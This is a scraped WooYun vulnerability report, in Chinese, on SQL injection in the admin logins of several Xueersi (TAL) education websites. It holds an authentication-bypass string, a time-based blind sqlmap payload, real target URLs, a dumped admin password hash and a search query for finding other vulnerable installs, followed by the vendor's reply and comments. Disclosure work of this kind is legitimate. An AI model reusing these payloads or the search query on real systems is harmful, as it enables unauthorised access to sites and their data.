{"id": 645, "wybug_id": "wooyun-2014-074522", "wybug_title": "学而思多个网站内容管理系统SQL注入漏洞可获取管理员权限", "wybug_corp": "好未来集团学而思培优", "wybug_author": "Coffee", "wybug_date": "2014-09-01 15:34", "wybug_open_date": "2014-10-16 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述： 学而思多个网站内容管理系统SQL注入漏洞可获取管理员权限（貌似这个是学而思自己做的CMS，旗下网站基本都在用） 详细说明：  以一个网站为例吧：http://kaixue.izhikang.com/admin.php，某活动的管理系统。延时盲注，用户名密码参数均未过滤。账号：admin' or '1'='1密码：随意\n\nback-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=admin' AND SLEEP(5) AND 'QLKl'='QLKl&password=pass---back-end DBMS: MySQL 5.0.11available databases [3]:[*] information_schema[*] sspxy[*] test得到管理员密码Hash：back-end DBMS: MySQL 5.0.11Database: sspxyTable: admin[1 entry]+----------+----------------------------------+| username | password                         |+----------+----------------------------------+| admin    | fa3ab04300afa717d5eb237c56cb28e2 |+----------+----------------------------------+用相同的Payload测试了学而思其他的几个系统的登录页面，部分存在该漏洞。CMS特征：Google关键字“为了防止被人破解密码，建议您经常更换您的登录密码。”部分存在漏洞的系统：http://zd.speiyou.com/admin/users/loginhttp://rxcs021.speiyou.cn/admin/users/loginhttp://zd.xueersi.com账号：admin' or '1'='1密码：随意通用的系统应该还有……   漏洞证明：  其他的一些，某诊断系统：back-end DBMS: MySQL 5.0.11Database: diagnosticTable: admin[6 columns]+----------------------+---------+| Column               | Type    |+----------------------+---------+| coste_total          | numeric || mod_freeway_products | numeric || php                  | numeric || questionid           | numeric || tb_id                | numeric || update_date          | numeric |+----------------------+---------+有些很明显的延时盲注，Sqlmap跑不出来，但是可以手注。   修复方案：  #1、过滤参数#2、这个应该是通用的CMS系统，所以自查下各系统吧   版权声明：转载请注明来源 Coffee@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-02 16:00 厂商回复： 多谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-01 16:31 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  前排    \n     2014-09-02 16:25 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  账号：admin' or '1'='1密码：随意这句话好像是乱入的……厂商别被误导了 @好未来集团学而思培优     \n     2014-09-04 13:57 |    \t\t好未来集团学而思培优(乌云厂商)\t\t \n  洞主的意思是？    \n     2014-09-04 18:12 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  @好未来集团学而思培优 额……就是说那句话是错的。你们修复了就行了。    \n     2014-10-16 18:01 |    \t\tzds426 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 住在北京)\t\t \n  @Coffee学而思应该请你做安全    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}